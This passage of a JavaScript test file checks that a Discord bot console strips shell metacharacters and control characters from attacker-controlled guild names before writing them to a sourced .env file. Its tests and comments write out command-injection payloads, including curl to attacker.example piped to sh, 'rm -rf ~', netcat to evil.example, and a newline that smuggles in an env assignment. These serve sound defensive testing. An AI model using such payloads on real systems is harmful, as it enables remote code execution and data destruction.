  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
  const state = readDiscordBotSettingsState({});
  assert.equal(state.hostedBotConnectedGuildId, null);
  assert.equal(state.hostedBotConnectedGuildName, null);
});

test("persistHostedBotConnectedGuild trims and length-caps a free-text guild name, and falls back to the guild id when the name is blank", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-sanitize-"));
  const longName = "x".repeat(200);
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "222222222222222222", guildName: `  ${longName}  ` });
  assert.equal(process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME.length, 100, "a free-text guild name must be capped, matching Discord's own 100-character guild-name limit");

  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "333333333333333333", guildName: "   " });
  assert.equal(process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME, "333333333333333333", "a blank guild name must fall back to the guild id rather than persisting an empty label");

  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});

// dune-awakening-selfhost-docker#870 (CRITICAL, found by automated review
// on already-merged #801): the guild display name is Discord-controlled
// free text (settable by anyone with Manage Server permission in a guild
// the console operator merely owns/administers) written into .env, which
// runtime/scripts/start-all.sh (and siblings) `. ./.env` inside
// `set -a; ...; set +a` -- a real bash source. The old blocklist
// (control chars + "=") left $ and backtick completely untouched, so a
// payload like `Evil$(curl attacker.example|sh)Server` would execute as
// a real shell command the next time any of those scripts ran.
test("persistHostedBotConnectedGuild strips every shell metacharacter from an attacker-controlled guild name, not just control characters and '='", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-shellsafe-"));
  // A bare apostrophe is deliberately NOT in this dangerous set -- it's
  // legitimate in real names ("O'Brien's Server") and inert inside the
  // double-quoted JSON.stringify() output quoteEnv() writes; `"` and `\`
  // ARE dangerous here (they could break out of that double-quoting) and
  // are correctly excluded by the allowlist below.
  const payload = "Evil$(touch /tmp/pwned)`touch /tmp/pwned2`;rm -rf ~|nc evil.example 1234&<>\\'\"~*Server";
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "444444444444444444", guildName: payload });
  const persisted = process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
  for (const dangerous of ["$", "`", ";", "|", "&", "<", ">", "\\", "\"", "~", "*", "(", ")"]) {
    assert.ok(!persisted.includes(dangerous), `sanitized guild name must never contain '${dangerous}': got ${JSON.stringify(persisted)}`);
  }
  assert.equal(persisted, "Eviltouch tmppwnedtouch tmppwned2rm -rf nc evil.example 1234'Server");
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});

// Layer 2 audit finding (real, found by /code-review high on this exact
// fix, before merge): the first version of the new allowlist used `\s`
// for whitespace, which also matches \n, \r, \t, \v, \f, and the Unicode
// line/paragraph separators -- not just a literal space -- so a raw
// control character in the guild name would have survived unfiltered.
// bash sourcing doesn't unescape quoteEnv()'s JSON-escaped "\n" back to a
// literal newline, but Docker Compose's own SEPARATE .env-file parser
// (used for ${VAR} interpolation in docker-compose.web.yml) is documented
// to do exactly that -- reopening a version of the exact risk #860's own
// comment already flags as "never traced" and was guarding against
// unconditionally.
test("persistHostedBotConnectedGuild strips raw control characters (newline, tab, CR, vertical/form feed, Unicode line separators) from the guild name, not just shell metacharacters", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-controlchars-"));
  const lineSeparator = "\u2028";
  const paragraphSeparator = "\u2029";
  const payload = `Evil\nDUNE_DISCORD_ADAPTER_ENABLED=false\r\t\v\f${lineSeparator}${paragraphSeparator} Server`;
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "666666666666666666", guildName: payload });
  const persisted = process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
  for (const [name, char] of [["newline", "\n"], ["CR", "\r"], ["tab", "\t"], ["vertical tab", "\v"], ["form feed", "\f"], ["U+2028", lineSeparator], ["U+2029", paragraphSeparator]]) {
    assert.ok(!persisted.includes(char), `sanitized guild name must never contain a raw ${name}: got ${JSON.stringify(persisted)}`);
  }
  assert.equal(persisted, "EvilDUNE_DISCORD_ADAPTER_ENABLEDfalse Server", "'=' and every control character (including the Unicode line/paragraph separators) are stripped; the underscore and the one literal space are legitimate, allowed characters and survive");
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});

// Closes the loop the finding above only argues in prose: actually writes
// a real .env file via the real persist function, then actually sources
// it through a real `sh -c '. ./.env'` (matching start-all.sh's own
// `set -a; . ./.env; set +a` pattern) and proves the payload never
// executes -- a sentinel file the payload would have created must not
// exist afterward.
test("a real .env file written by persistHostedBotConnectedGuild is safe to actually source with sh -- the injection payload never executes", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-realsource-"));
  const sentinel = join(dir, "pwned");
  const payload = `Evil$(touch ${sentinel})Server`;
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "555555555555555555", guildName: payload });
  execFileSync("sh", ["-c", `set -a; . ./.env; set +a`], { cwd: dir });
  assert.ok(!existsSync(sentinel), "sourcing the written .env file must never execute the guild name's own content as shell code");
});

test("persistHostedBotConnectedGuild is a no-op (does not write) when guildId is missing", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-noop-"));
  const result = await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildName: "Fleetyard" });
  assert.equal(result.ok, false);
  assert.ok(!existsSync(join(dir, ".env")), "no .env file should be created when there is no real guildId to persist");
});

// Fix round 2 (final-review re-review, Priority 2): persistHostedBotConnectedGuild()
// had no corresponding clear path, so "Connected to hosted bot for {name}"
// could never stop being shown -- not even after regenerating the adapter
// token (which mentat's registration is keyed to) or switching back to
// self-hosted. These lock in the new clearHostedBotConnectedGuild() and its
// two real call sites.
test("clearHostedBotConnectedGuild clears both the persisted guild id and name, mirrored into the running process", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-clear-"));
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
  assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "sanity check: the connection is really persisted before clearing it");

  const result = await clearHostedBotConnectedGuild({ repoRoot: dir });
  assert.equal(result.ok, true);
  const state = readDiscordBotSettingsState({});
  assert.equal(state.hostedBotConnectedGuildId, null);
  assert.equal(state.hostedBotConnectedGuildName, null);
  const envContent = readFileSync(join(dir, ".env"), "utf8");
  // quoteEnv() (envFile.js) JSON-quotes an empty string (it doesn't match
  // the bare-word allowlist pattern), so the persisted value on disk is
  // `=""`, not a bare `=` -- readDiscordBotSettingsState() reads it back
  // through process.env, which already strips the quoting, so the
  // assertions above (via readDiscordBotSettingsState) are the real
  // behavioral check; this just confirms what actually landed on disk.
  assert.match(envContent, /^DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID=""$/m);
  assert.match(envContent, /^DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME=""$/m);

  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});

test("regenerateDiscordBotToken clears a previously-persisted hosted-bot connection -- mentat's registration is keyed to the now-invalid old token", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-regen-clears-"));
  const enableResult = await enableDiscordBotAdapter({ repoRoot: dir }, { player: [], moderator: [], admin: [] });
  assert.equal(enableResult.ok, true);
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
  assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "sanity check: the connection is really persisted before regenerating");

  const result = await regenerateDiscordBotToken({ repoRoot: dir });
  assert.equal(result.ok, true);
  const state = readDiscordBotSettingsState({});
  assert.equal(state.hostedBotConnectedGuildId, null, "regenerating the adapter token must clear the persisted hosted-bot connection");
  assert.equal(state.hostedBotConnectedGuildName, null);

  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});

test("updateDiscordBotRoleIds clears a previously-persisted hosted-bot connection when deploymentChoice is saved as self-hosted", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-selfhosted-clears-"));
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
  assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "sanity check: the connection is really persisted before switching to self-hosted");

  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "self-hosted" });
  const state = readDiscordBotSettingsState({});
  assert.equal(state.hostedBotConnectedGuildId, null, "switching back to self-hosted must clear the persisted hosted-bot connection");
  assert.equal(state.hostedBotConnectedGuildName, null);

  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});

// Real UAT finding (2026-09-10): the 3-step wizard redesign needs
// deploymentChoice persisted the moment "Hosted bot" is picked -- before
// role IDs or the adapter token exist -- so /oauth/start's gate passes in
// time for the new step 1 ("Add bot to Discord"). Deliberately the
// smallest possible write: only this one key, no restart-task creation
// (unlike updateDiscordBotRoleIds/enableDiscordBotAdapter, which both
// return { ok, task } via their route handlers -- this never does).
test("setDeploymentChoice persists only deploymentChoice -- never touches role IDs, the token, or the enabled flag", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-set-choice-"));
  const before = readDiscordBotSettingsState({});
  assert.equal(before.enabled, false);

  const result = await setDeploymentChoice({ repoRoot: dir }, "hosted");
  assert.deepEqual(result, { ok: true });

  const after = readDiscordBotSettingsState({});
  assert.equal(after.deploymentChoice, "hosted");
  assert.equal(after.enabled, false, "must not enable the adapter");
  assert.equal(after.tokenConfigured, false, "must not mint a token");
  assert.deepEqual(after.roleIds, { player: [], moderator: [], admin: [] }, "must not touch role IDs");

  delete process.env.DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE;
});

test("setDeploymentChoice rejects anything other than \"hosted\" or \"self-hosted\"", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-set-choice-invalid-"));
  const result = await setDeploymentChoice({ repoRoot: dir }, "not-a-real-choice");
  assert.deepEqual(result, { ok: false });
  assert.equal(readDiscordBotSettingsState({}).deploymentChoice, null, "an invalid value must not be persisted");
});

test("setDeploymentChoice clears a previously-persisted hosted-bot connection when switching to self-hosted", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-set-choice-clears-"));
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
  assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard");

  await setDeploymentChoice({ repoRoot: dir }, "self-hosted");
  const state = readDiscordBotSettingsState({});
  assert.equal(state.hostedBotConnectedGuildId, null);
  assert.equal(state.hostedBotConnectedGuildName, null);

  delete process.env.DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});

test("updateDiscordBotRoleIds does NOT clear a persisted hosted-bot connection when deploymentChoice is saved as hosted (or omitted)", async () => {
  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-hosted-nostrip-"));
  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });

  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "hosted" });
  assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "saving deploymentChoice as \"hosted\" again must not clear a real, still-valid connection");

  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, {});
  assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "an ordinary role-ID-only save (no deploymentChoice) must not clear a real, still-valid connection");

  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
});
